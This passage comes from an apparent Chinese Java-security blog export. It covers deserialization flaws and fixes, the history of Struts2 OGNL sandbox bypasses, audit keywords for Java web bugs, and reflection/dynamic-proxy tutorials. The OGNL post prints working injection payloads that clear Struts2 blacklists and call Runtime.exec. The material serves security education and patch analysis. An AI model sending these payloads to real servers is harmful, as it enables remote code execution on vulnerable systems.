漏洞\n\nfastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并通过json来填充其属性值。而JDK自带的类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中有一个私有属性_bytecodes，其部分方法会执行这个值中包含的Java字节码。通过注入恶意代码到_bytecode，导致任意代码执行漏洞。\n\n**注：**Fastjson和Jackson Payload构造的方式都一样，虽然解析函数不一样，但是都是将json转为object，过程是类似的。\n\n\n\n## 防止反序列化漏洞\n\n### 1、Java Serialization\n\n- jdk里增加了一个filter机制 [http://openjdk.java.net/jeps/290 ](http://openjdk.java.net/jeps/290 )，这个一开始是出现在jdk9上的，后面移值回jdk6/7/8上，如果安装的jdk版本是比较新的，可以找到相关的类\n- Oracle打算废除java序列化：https://www.infoworld.com/article/3275924/java/oracle-plans-to-dump-risky-java-serialization.html\n\n### 2、jackson-databind\n\n- jackson-databind里是过滤掉一些已知的类，参见[SubTypeValidator.java](https://github.com/FasterXML/jackson-databind/blob/jackson-databind-2.9.6/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java)\n- jackson-databind的[CVE issue列表](https://github.com/FasterXML/jackson-databind/issues?q=is%3Aissue+label%3ACVE+is%3Aclosed)\n\n### 3、fastjson\n\n- fastjson通过一个denyList来过滤掉一些危险类的package，参见[ParserConfig.java](https://github.com/alibaba/fastjson/blob/1.2.7.sec01/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L169)\n- fastjson在新版本里denyList改为通过hashcode来隐藏掉package信息，但通过这个[DenyTest5](https://github.com/alibaba/fastjson/blob/1.2.47/src/test/java/com/alibaba/json/bvt/parser/deser/deny/DenyTest5.java)可以知道还是过滤掉常见危险类的package\n- fastjson在新版本里默认把autoType的功能禁止掉了\n\n**这些序列化漏洞的根本原因是：没有控制序列化的类型范围。**\n\n仔细看的读者会发现并没有提及protobuf的反序列化漏洞，为什么在protobuf里并没有这些反序列化问题？\n\n- protobuf在IDL里定义好了package范围\n- protobuf的代码都是自动生成的，怎么处理二进制数据都是固定的\n\nprotobuf把一切都框住了，少了灵活性，自然就少漏洞。\n\n**注：**IDL（Interface description language）文件：参与通讯的各方需要对通讯的内容需要做相关的约定（Specifications）。为了建立一个与语言和平台无关的约定，这个约定需要采用与具体开发语言、平台无关的语言来进行描述。这种语言被称为接口描述语言（IDL），采用IDL撰写的协议约定称之为IDL文件。\n\n\n\n## 总结：\n\n本文总结了java反序列化的几种方式，并回顾了java几个经典的漏洞以及对应的修复方案，希望通过本文，大家对java反序列化漏洞有更深刻的认知。\n\n \n\n**参考链接：**\n\nhttp://hengyunabc.github.io/thinking-about-grpc-protobuf/\n\nhttps://blog.csdn.net/u011721501/article/details/78555246\n\nhttps://www.freebuf.com/sectool/165655.html\n\nhttps://www.cnblogs.com/he1m4n6a/p/10131566.html\n\n[https://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/](https://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/)\n\nhttps://www.jianshu.com/p/e9e631285cb0","tags":["JAVA","反序列化"],"categories":["JAVA安全教程"]},{"title":"OGNL攻防史","url":"/2019/02/13/OGNL攻防史/","content":"# 前言\n\n之前基础篇对struts2的框架做了介绍，本篇章将对struts2的原理做个简介。目前struts2已经被阿里巴巴等大厂弃用了，但是作为曾经风靡一时的框架，并且互联网上还有大量的struts2应用，是很有必要学习一番的。\n\n# OGNL表达式\n\nOGNL（Object Graph Navigation Language）即对象图形导航语言，是一个开源的表达式引擎。使用OGNL，你可以通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化。如果我们把表达式看做是一个带有语义的字符串，那么OGNL无疑成为了这个语义字符串与Java对象之间沟通的桥梁。我们可以轻松解决在数据流转过程中所遇到的各种问题。\n\n## OGNL三要素\n\n**Expression(表达式)：**\n\nExpression规定OGNL**要做什么**，其本质是一个带有语法含义的字符串,这个字符串将规定操作的类型和操作的内容。OGNL支持的语法非常强大，从对象属性、方法的访问到简单计算，甚至支持复杂的lambda表达式。\n\n**Root(根对象)：**\n\nOGNL的root对象可以理解为OGNL要操作的对象，表达式规定OGNL要干什么，root则指定对**谁进行操作**。OGNL的root对象实际上是一个java对象，是所有OGNL操作的实际载体。\n\n**Context(上下文)：**\n\n有了表达式和根对象，已经可以使用OGNL的基本功能了。例如，根据表达式对root对象进行getvalue、setvalue操作。不过事实上在OGNL内部，所有的操作都会在一个特定的数据环境中运行，这个数据环境就是OGNL的上下文。**单说就是上下文将规定OGNL的操作在哪里进行。**OGNL的上下文环境是一个MAP结构，定义为OgnlContext，root对象也会被添加到上下文环境中，作为一个特殊的变量进行处理。\n\nOGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值：\n\n![](/images/a5/1.png)\n\nsetValue通过传入的OGNL表达式，在给定的上下文环境中，往root对象里写值:\n\n![](/images/a5/2.png)\n\n## OGNL基本操作\n\n1. 支持对象方法调用，形式如：objName.methodName()；\n\n2. 支持类静态的方法调用和值访问，表达式的格式为 **@[类全名（包括包路）]@[方法名 | 值名]**，例如：\n\n```java\n@java.lang.String@add（ '11' , 'hahhaha' ）\n```\n\n3. 支持赋值操作和表达式串联，例如：\n\n```java\nnumber=18, price=100,Total()；\n```\n\n那么返回1800；\n\n4. 访问OGNL上下文（OGNL context）其实就是Map （教室、老师、学生）和ActionContext，\n\n   - OgnlContext=根对象(1)+非根对象(N)\n\n     - 老师：根对象 1\n\n     - 学生：非根对象 n\n\n       非根对象要通过**#key**访问，根对象可以省略**#key**\n\n   - **根对象和非根对象的概括**\n\n     - 一个上下文中只有一个根对象\n     - 取跟对象的值，只需要直接通过根对象属性即可\n     - 非根对象取值必须通过指定的上下文容器中的**#key**属性去取。\n\n# OGNL历史\n\nOgnlContext中的_memberAccess与securityMemberAccess是同一个SecurityMemberAccess类的实例，而且内容相同，也就是说全局的OgnlUtil实例都共享着相同的设置。如果利用OgnlUtil更改了设置项（excludedClasses、excludedPackageNames、excludedPackageNamePatterns）则同样会更改_memberAccess中的值。\n\n以下图例左边都是较为新的版本，右边为老版本。\n\n## Struts 2.3.14.1版本前\n\nS2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于SecurityMemberAccess：\n\n![](/images/a5/3.png)\n\n左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改allowStaticMethodAccess=true，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：\n\n```java\n(#_memberAccess[‘allowStaticMethodAccess’]=true).(@java.lang.Runtime@getRuntime().exec(‘calc’))\n```\n\n而在2.3.14.1版本后将allowStaticMethodAccess设置成**final属性**后，就不能显式更改了，这样的poc显然也失效了。\n\n## Struts 2.3.20版本前\n\n在2.3.14.1后虽然不能更改allowStaticMethodAccess了，但是还是可以通过_memberAccess使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：\n\n```java\n(#p=new java.lang.ProcessBuilder(‘xcalc’)).(#p.start())\n```\n\n直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用ProcessBuilder这个payload了。\n\n## Struts 2.3.29版本前\n\n左为2.3.29版本，右边为2.3.28版本\n\n![](/images/a5/4.png)\n\n从黑名单中可以看到禁止使用了ognl.MemberAccess和ognl.DefaultMemberAccess，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用_memberAccess调用静态对象DefaultMemberAccess，然后用DefaultMemberAccess覆盖_memberAccess。那么为什么说这样就可以使用静态方法了呢？ 我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：\n\n```java\n(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))\n```\n\n我们来看一下ognl.OgnlContext@DEFAULT_MEMBER_ACCESS：\n\n![](https://p5.ssl.qhimg.com/t01ecfd1c68ebe3f988.jpg)\n\n看过上一节的都知道，在程序运行时在setOgnlUtil方法中将黑名单等数据赋给SecurityMemberAccess，而这就是创建_memberAccess的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而SecurityAccess这个对象的父类本身就是ognl.DefaultMemberAccess，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类DefaultMemberAccess覆盖_memberAccess中的内容，就相当于初始化了_memberAccess，这样就可以绕过其之前所设置的黑名单以及限制条件。\n\n## Struts 2.3.30+/2.5.2+\n\n到了2.3.30(2.5.2)之后的版本，我们可以使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：\n\n```java\n(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))\n```\n\n可以看到绕过的关键点在于：\n\n- 利用Ognl执行流程利用container获取了OgnlUtil实例\n- 清空了OgnlUtil$excludedClasses黑名单，释放了DefaultMemberAccess\n- 利用setMemberAccess覆盖\n\n而具体的流程可以参考2.2的内容。\n\n## Struts 2.5.16\n\n分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：\n\n- 2.5.13版本后禁止访问coontext.map\n\n- 准确来说是ognl包版本的区别，在2.5.13中利用的是3.1.15版本，在2.5.12版本中使用的是3.1.12版本：\n- ![](/images/a5/6.png)\n- 而这个改变是在OgnlContext中：\n- ![](/images/a5/7.png)\n- 不只是get方法，put和remove都没有办法访问了，所以说从根本上禁止了对context.map的访问。\n\n- 2.5.20版本后excludedClasses不可变了，具体的代码在[这里](https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca)\n\n所以在S2-045时可使用的payload已经没有办法再使用了，需要构造新的利用方式。\n\n文章提出了这么一种思路:\n\n- 没有办法使用context.map，可以调用attr，前文说过attr中保存着整个context的变量与方法，可以通过attr中的方法返回给我们一个context.map。\n- 没有办法直接调用excludedClasses，也就不能使用clear方法来清空，但是还可以利用setter来把excludedClasses给设置成空\n- 清空了黑名单，我们就可以利用DefaultMemberAccess来覆盖_memberAccess，来执行静态方法了。\n\n而这里又会出现一个问题，当我们使用OgnlUtil的setExcludedClasses和setExcludedPackageNames将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说_memberAccess是源数据的一个引用，就像前文所说的，在每次createAction时都是通过setOgnlUtil利用全局的源数据创建一个引用，这个引用就是一个MemberAccess对象，也就是_memberAccess。所以这里只会影响这次请求的OgnlUtil而并未重新创建一个新的_memberAccess对象，所以旧的_memberAccess对象仍未改变。\n\n而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的OgnlUitl作为源重新创建一个_memberAccess，这样在第二次请求中_memberAccess就是黑名单被置空的情况，这个时候就释放了DefaultMemberAccess，就可以进行正常的覆盖以及执行静态方法。\n\npoc为：\n\n```java\n(#context=#attr[‘struts.valueStack’].context).(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(”)).(#ognlUtil.setExcludedPackageNames(”))\n\n(#context=#attr[‘struts.valueStack’].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘curl 127.0.0.1:9001’))\n```\n\n# 现阶段的OGNL\n\nStruts2在 2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。\n\n## 2.5.17的改变（限制命名空间）\n\n1. 黑名单的变动，禁止访问com.opensymphony.xwork2.ognl.\n<img src=\"/images/a5/8.png\" style=\"zoom:50%;\" />\n- 讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了com.opensymphony.xwork2.ognl.也就是说我们根本没办法访问这个Struts2重写的ognl包了。\n\n2. 切断了动态引用的方式，需要利用构造函数生成\n![](/images/a5/9.png)\n- 不谈重写了setExcludedClasses和setExcludedPackageNamePatterns，单单黑名单的改进就极大的限制了利用。\n\n## 2.5.19的改进\n\n1. ognl包的升级，从3.1.15升级到3.1.21\n![](/images/a5/10.png)\n\n2. 黑名单改进\n![](/images/a5/11.png)\n\n3. 在OgnlUtil中setXWorkConverter、setDevMode、setEnableExpressionCache、setEnableEvalExpression、setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames、setContainer、setAllowStaticMethodAccess、setDisallowProxyMemberAccess都从public方法变成了protected方法了：\n\n<img src=\"/images/a5/12.png\" style=\"zoom:50%;\" />\n<img src=\"/images/a5/13.png\" style=\"zoom:50%;\" />\n\n也就是说没有办法显式调用setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames了。\n\n## master分支的改变\n\n1. ognl包的升级，从3.1.21升级到3.2.10，直接删除了DefaultMemberAccess.java，同时删除了静态变量DEFAULT_MEMBER_ACCESS，并且_memberAccess变成了final：\n\n<img src=\"/images/a5/14.png\" style=\"zoom:50%;\" />\n<img src=\"/images/a5/15.png\" style=\"zoom:50%;\" />\n\n2. SecurityMemberAccess不再继承DefaultMemberAccess而直接转为MemberAccess接口的实现：\n<img src=\"/images/a5/16.png\" style=\"zoom:50%;\" />\n\n可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，DefaultAccess彻底退出了历史舞台意味着利用父类覆盖_memberAccess的利用方式已经无法使用，而黑名单对于com.opensymphony.xwork2.ognl的限制导致我们基本上没有办法利用Ognl本身的API来更改黑名单，同时_memberAccess变为final属性也使得S2-057的这种利用_memberAccess暂时性的特征而进行“重放攻击”的方式测地化为泡影。\n\n\n\n参考：\n\nhttps://blog.csdn.net/pngyul/article/details/82723719\n\nhttps://www.anquanke.com/post/id/169735#h3-4\n\nhttps://www.cnblogs.com/huangting/p/11105051.html","tags":["OGNL","Struts2"],"categories":["JAVA安全教程"]},{"title":"JAVA常见WEB漏洞审计","url":"/2019/02/02/JAVA常见WEB漏洞审计/","content":"# 简介\n\n本篇将介绍java web的内容，其实sql，xss等多数漏洞和其他的语言类似，所以不对具体的漏洞原理做分析，本文主要就是对审计关键字的提炼。学习java web具体代码程序的触发过程，不仅可以加深对漏洞的理解，如果你需要从事代码审计等工作，都会有很大的帮助。详细的代码可参考：https://github.com/JoyChou93/java-sec-code。\n\n# SQL漏洞\n\njava产生的漏洞形式主要有两种：\n\n1. 和其他语言一样，通过拼接字符串导致sql\n\n2. 使用myhabits数据库时，用${}拼接了字符串\n\n   ![](/images/a4/1.png)\n\n**审计：**\n\n1. 查看配置文件确定使用的数据库有哪些\n2. 查看所有的controller，看是存在数据库操作的动作\n3. 查看mapper，看是否使用了字符串拼接或者${}\n4. 上述都不管用的时候，直接搜select *等关键字，看具体数据库怎么操作的\n\n# XSS漏洞\n\n这个和其他语言都一样。\n\n**审计：**\n\n1. 查看所有的controller，看返回是否有把未过滤的字符返回给前端\n\n# 命令注入\n\n主要有下面两种两种方法\n\n```java\nRuntime.getRuntime().exec(cmds);\nnew ProcessBuilder(cmds).start();\n```\n\n**审计：**\n\n1. 全局搜索关键字 getRuntime.exec( 和 ProcessBuilder().start\n\n# SSIT\n\njava模板注入，主要是由两个组件velocity和freemarker产生的。\n\n**审计：**\n\n1. 可以查看pom.xml中是否使用了上述两种组件\n2. 全局搜关键字 new VelocityContext( 和 new StringTemplateLoader( \n\n# 重定向漏洞\n\n主要有三种：\n\n1. redirect(@RequestParam(\"url\")\n2. response.setHeader(\"Location\", url);\n3. response.sendRedirect(url); \n\n**审计：**\n\n1. 全局搜索上面三个函数 redirect(, reponse.setHeader(, response.sendRedirect\n\n# 目录穿越漏洞\n\n查看所有controller查找文件相关的操作。\n\n**审计：**\n\n1. 查找 new File( 等关键字\n\n# SSRF漏洞\n\n查看所有controller操作url相关的函数，查找如下一些关键字。\n\n**审计**：\n\n1. new URL(\n2. urlConnection.getInputStream(\n3. HttpURLConnection\n4. Request.Get(\n5. .openStream(\n\n# 文件上传漏洞\n\n查看所有controller有关上传操作的函数，查找如下一些关键字\n\n**审计：**\n\n1. .getOriginalFilename(\n2. .write(\n3. new File(\n\n# XXE漏洞\n\njava解析xml的格式比较多，整理如下关键字\n\n**审计：**\n\n1. XMLReaderFactory.createXMLReader\n2. new SAXBuilder(\n3. new SAXReader(\n4. SAXParserFactory.newInstance(\n5. new Digester(\n6. DocumentBuilderFactory.newInstance(\n","tags":["JAVA","web漏洞","代码审计"],"categories":["JAVA安全教程"]},{"title":"JAVA反射与动态代理","url":"/2019/01/28/JAVA反射与动态代理/","content":"# JAVA反射\n\n## 什么是Java反射\n\n反射是Java的特征之一，是一种**间接操作目标对象的机制**，核心是JVM在运行的时候才动态加载类，并且对于任意一个类，都能够知道这个类的所有属性和方法，调用方法/访问属性，不需要提前在编译期知道运行的对象是谁，他允许运行中的Java程序获取类的信息，并且可以操作类或对象内部属性。程序中对象的类型一般都是在编译期就确定下来的，而当我们的程序在运行时，可能需要动态的加载一些类，这些类因为之前用不到，所以没有加载到jvm，这时，使用Java反射机制可以在**运行期动态的创建对象并调用其属性**，它是在运行时根据需要才加载。\n<!-- more -->\n## 反射的原理\n\n![](/images/a2/1.png)\n\n## 反射的优缺点\n\n**优点：**使用反射，我们就可以在运行时获得类的各种内容，进行反编译，对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。\n\n**缺点：**\n\n1. 反射会消耗一定的系统资源，因此，如果不需要动态地创建一个对象，那么就不需要用反射；\n2. 反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。\n\n## 反射的用途\n\n1. 反编译：.class-->.java\n2. 通过反射机制访问java对象的属性，方法，构造方法等\n3. 当我们在使用IDEA时，当我们输入一个对象或者类，并想调用他的属性和方法是，一按点号，编译器就会自动列出他的属性或者方法，这里就是用到反射。\n4. 反射最重要的用途就是开发各种通用框架。比如很多框架（Spring）都是配置化的（比如通过XML文件配置Bean），为了保证框架的通用性，他们可能需要根据配置文件加载不同的类或者对象，调用不同的方法，这个时候就必须使用到反射了，运行时动态加载需要的加载的对象。\n\n## 反射机制常用的类\n\n```Java\nJava.lang.reflect.Constructor;\nJava.lang.reflect.Field;\nJava.lang.reflect.Method;\nJava.lang.reflect.Modifier;\n```\n\n## 反射的基本使用\n\n- Object.getclass()   //需要创建对象\n\n- Object.class    //需要导入对应的类包\n\n- Class.forName    //最常用\n\n**代码实例：**\n\n1、创建一个需要被反射的测试类\n\n```java\nimport static java.lang.System.out;\nimport java.lang.String;\n\npublic class User {\n    private String username;\n    public String interest;\n\n    public User() {\n        ;\n    }\n\n    private User(String name) {\n        System.out.println(\"init.\");\n    }\n\n    public String getUsername(){\n        return username;\n    }\n\n    public void setUsername(String username){\n        this.username = username;\n    }\n\n    public String getInterest(){\n        return interest;\n    }\n\n    public void setInterest(String interest){\n        this.interest = interest;\n    }\n\n    public static void main(String args[]) {\n        User userinfo = new User();\n        userinfo.setUsername(\"xiaoming\");\n        out.println(userinfo.getUsername());\n    }\n}\n```\n\n2、反射调用User类\n\n```java\nimport java.lang.reflect.*;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.System;\nimport java.lang.String;\n\npublic class Reflect {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\n        Class clazz = Class.forName(\"User\"); //包路径，这里测试写在同目录\n\n        System.out.println(\"===获取公共的构造函数===\");\n        Constructor[] constructors = clazz.getConstructors();\n        for (Constructor constructor: constructors)\n            System.out.println(constructor);\n\n        System.out.println(\"===获取所有的构造函数===\");\n        Constructor[] declaredConstructors = clazz.getDeclaredConstructors();\n        for (Constructor constructor: declaredConstructors)\n            System.out.println(constructor);\n\n        System.out.println(\"===获取公共的属性===\");\n        Field[] fields = clazz.getFields();\n        for (Field field: fields)\n            System.out.println(field);\n\n        System.out.println(\"===获取所有的属性===\");\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for (Field field: declaredFields)\n            System.out.println(\"ALL: \" + field);\n        \n        System.out.println(\"===获取特定的函数===\");\n        Method method = clazz.getDeclaredMethod(\"setUsername\", String.class);\n        System.out.println(method);\n\n        //赋值操作\n        Object obj = clazz.getConstructor().newInstance();\n        Object invoke = method.invoke(obj, new String[]{\"我是科比\"});\n\n        System.out.println(\"===测试===\");\n        String name= (String) clazz.getDeclaredMethod(\"getUsername\").invoke(obj);\n        System.out.println(name);\n    }\n}\n```\n\n![](/images/a2/2.png)\n\n这个只做了部分的测试，get\\_系列方法的是获取公用，getDeclared\\_系列方法获取所有，get_(参数)系列获取特定的。如果需要查看所有的方法，可以查看官方文档，或者IDEA跟进Class.java文件查看。这边需要注意的是 method.invoke(obj, args) ，**如果method是静态方法，obj是可以省略的。**\n\n# JAVA动态代理\n\n## 代理模式简介\n\n代理模式是一种常用的设计模式。代理模式为其对象提供了一种代理以控制对这个对象的访问。代理模式可以将主要业务与次要业务进行松耦合的组装。根据代理类的创建时机和创建方式的不同，可以将其分为静态代理和动态代理两种形式：\n\n- 在程序运行前就已经存在的编译好的代理类是为静态代理，\n- 在程序运行期间根据需要动态创建代理类及其实例来完成具体的功能是为动态代理。\n\n## 动态代理简介\n\n对代理模式而言，一般来说，具体主题类与其代理类是一一对应的，这也是静态代理的特点。但是，也存在这样的情况：有N个主题类，但是代理类中的“预处理、后处理”都是相同的，仅仅是调用主题不同。那么，若采用静态代理，必然需要手动创建N个代理类，这显然让人相当不爽。动态代理则可以简单地为各个主题类分别生成代理类，**共享“预处理，后处理”功能**，这样可以大大减小程序规模，这也是动态代理的一大亮点。\n\n在动态代理中，代理类是在运行时期生成的。因此，相比静态代理，动态代理可以很方便地对委托类的相关方法进行统一增强处理，如添加方法调用次数、添加日志功能等等。\n\n### JDK动态代理机制的相关类与接口\n\n**java.lang.reflect.Proxy：**该类用于动态生成代理类，只需传入被监控对象隶属的类文件在内存中真实地址、被监控对象隶属的类文件实现接口以及InvocationHandler通知对象便可为目标接口生成代理类及代理对象。\n\n```\n// 方法 1: 该方法用于获取指定代理对象所关联的InvocationHandler static InvocationHandler\ngetInvocationHandler(Object proxy)\n\n// 方法 2：该方法用于获取关联于指定类装载器和一组接口的动态代理类的类对象 static Class\ngetProxyClass(ClassLoader loader, Class[] interfaces)\n\n// 方法 3：该方法用于判断指定类是否是一个动态代理类 static boolean isProxyClass(Class cl)\n\n// 方法 4：该方法用于为指定类装载器、一组接口及调用处理器生成动态代理类实例 static Object\nnewProxyInstance(ClassLoader loader, Class[] interfaces,\nInvocationHandler h)\n```\n\n**java.lang.reflect.InvocationHandler：**该接口包含一个invoke方法，通过该方法实现对委托类的代理的访问，是代理类完整逻辑的集中体现，包括要切入的增强逻辑和进行反射执行的真实业务逻辑。\n\n```\nObject invoke(Object proxy, Method method, Object[] args)\n```\n\n该方法是代理类完整逻辑的集中体现。在被监控行为将要执行时，会被JVM拦截。被监控行为和行为实现方法会被作为参数输送invoke，通常通过反射完成对具体角色业务逻辑的调用，并对其进行增强。\n\n- 第一个参数既是代理类实例。\n- 第二个参数是被调用的方法对象。\n- 第三个方法是调用参数。\n\n**java.lang.ClassLoader：**类加载器类，负责将类的字节码装载到Java虚拟机中并为其定义类对象，然后该类才能被使用。Proxy静态方法生成动态代理类同样需要通过类加载器来进行加载才能使用，它与普通类的唯一区别就是其字节码是由JVM在运行时动态生成的而非预存在于任何一个.class 文件中。JDK动态代理使用步骤\n\n### JDK动态代理的一般步骤\n\n1、创建被代理的接口和类；\n\n2、实现InvocationHandler接口，对目标接口中声明的所有方法进行统一处理；\n\n3、调用Proxy的静态方法，创建代理类并生成相应的代理对象；\n\n4、使用代理。\n\n### 生活案例\n\n**饭前便后要洗手**\n一、分析出主要业务和次要业务\n【主要业务】：吃饭，上厕所\n【次要业务】：洗手\n\n二、JDK代理模式实现\n\n1. 接口角色： 定义所有需要被监听行为\n2. 接口实现类：中国人、印度人\n3. 通知类：\n   - 次要业务进行具体实现\n   - 通知JVM，当前被拦截的主要业务方法与次要业务方法应该如何绑定执行\n\n4. 监控对象（代理对象）\n   - 被监控实例对象 需要被监控的行为\n   - 具体通知类实例对象\n\n### 代码实现\n\n1、定义接口类\n\n```java\npublic interface BaseService {\n    void eat();\n    void wc();\n}\n```\n\n2、编写接口的实现类，即具有某些行为的实体\n\n```java\npublic class Person implements BaseService {\n\n    @Override\n    public void eat() { //主要业务，代理模式要求开发人员只关心主要业务\n        System.out.println(\"吃饭.\");\n    }\n\n    @Override\n    public void wc() {\n        System.out.println(\"上厕所.\");\n    }\n}\n```\n\n3、创建通知类\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\n\npublic class Invocation implements InvocationHandler {\n\n    private BaseService obj;//具体被监控对象\n\n    public Invocation(BaseService param){\n        this.obj = param;\n    }\n\n    /*\n     *\n     *  invoke方法：在被监控行为将要执行时，会被JVM拦截\n     *             被监控行为和行为实现方会被作为参数输送invoke\n     *             ****\n     *             通知JVM,这个被拦截方法是如何与当前次要业务方法绑定实现\n     *  invoke方法三个参数\n     *\n     *           int v= 小明.eat();//JVM拦截\n     *            eat方法封装为Mehtod类型对象\n     *            eat方法运行时接受所有的实参封装到Object[]\n     *            将负责监控小明的代理对象作为invoke方法第一个参数\n     *\n     */\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] params) throws Throwable {\n        //1.局部变量，接受主要业务方法执行完毕后返回值\n        Object value;\n        //2.确认当前被拦截行为\n        String methodName= method.getName();\n        //3.根据被拦截行为不同，决定主要业务和次要业务如何绑定执行\n        if(\"eat\".equals(methodName)){//饭前要洗手\n            wash();                            //洗手\n            value=method.invoke(this.obj, params);   //吃饭\n        }else{//便后要洗手\n            value=method.invoke(this.obj, params);\n            wash();\n        }\n        return value; //返回被拦截方法，需要调用地方\n    }\n\n    //次要业务\n    public void wash(){\n        System.out.println(\"-----洗手----\");\n    }\n}\n```\n\n4、创建监控对象，通过Proxy类的静态方法newProxyInstance创建代理对象\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\n\nclass ProxyFactory {\n    /*\n     *\n     *  JDK动态代理模式下，代理对象的数据类型\n     *  应该由监控行为来描述\n     *  参数： Class文件，监控类\n     */\n    public static BaseService Builder(Class classFile) throws Exception {\n\n        //1.创建被监控实例对象\n        BaseService obj = (BaseService) classFile.newInstance();\n        //2.创建一个通知对象 用接口来描述\n        InvocationHandler adviser = new Invocation(obj);\n        //3.向JVM申请负责监控obj对象指定行为的监控对象（代理对象）\n        /*\n         *  loader:被监控对象隶属的类文件在内存中真实地址\n         *  interfaces:被监控对象隶属的类文件实现接口\n         *  adviser：监控对象发现小明要执行被监控行为，应该由哪一个通知对象进行辅助\n         */\n        BaseService $proxy = (BaseService) Proxy.newProxyInstance(\n                obj.getClass().getClassLoader(),\n                obj.getClass().getInterfaces(),\n                adviser);\n        return $proxy;\n    }\n}\n```\n\n5、测试\n\n```java\nimport java.lang.*;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        BaseService mike= ProxyFactory.Builder(Person.class);\n        mike.eat();\n        System.out.println(\"================\");\n        mike.wc();\n    }\n}\n```\n\n![](/images/a2/3.png)\n\n\n\n# JAVA动态字节码\n\n## 动态字节码技术\n\nJava 代码都是要被编译成字节码后才能放到 JVM 里执行的，而字节码一旦被加载到虚拟机中，就可以被解释执行。字节码文件（.class）就是普通的二进制文件，它是通过 Java 编译器生成的。而只要是文件就可以被改变，**如果我们用特定的规则解析了原有的字节码文件，对它进行修改或者干脆重新定义，这不就可以改变代码行为了么**。动态字节码技术优势在于 Java 字节码生成之后，对其进行修改，增强其功能，这种方式相当于对应用程序的二进制文件进行修改。\n\n通过动态编程的方式，我可以直接对已经存在的java字节码进行操作，也可以在内存中动态生成JAVA代码，动态编译执行，在安全中常用于生成payload，这种方式生成的payload优点：**能够注入pure-java的shell来绕过java原生的安全防护。**\n\nJava 生态里有很多可以动态处理字节码的技术，比较流行的有两个，一个是 ASM，一个是 Javassist 。\n\n- ASM：直接操作字节码指令，执行效率高，但涉及到JVM的操作和指令，要求使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。\n\n- Javassist：提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，简单、快速，对使用者要求较低。\n\n## Javassist简介\n\nJavassist 是一个开源的分析、编辑和创建Java字节码的类库。其主要的优点，**在于简单，而且快速。直接使用 java 编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。**\n\nJavassist 中最为重要的是 **ClassPool，CtClass ，CtMethod 以及 CtField** 这几个类。\n\n```\nClassPool：一个基于 Hashtable 实现的 CtClass 对象容器，其中键是类名称，值是表示该类的 CtClass 对象。\nCtClass：CtClass 表示类，一个 CtClass (编译时类）对象可以处理一个 class 文件，这些 CtClass 对象可以从 ClassPool 获得。\nCtMethods：表示类中的方法。\nCtFields 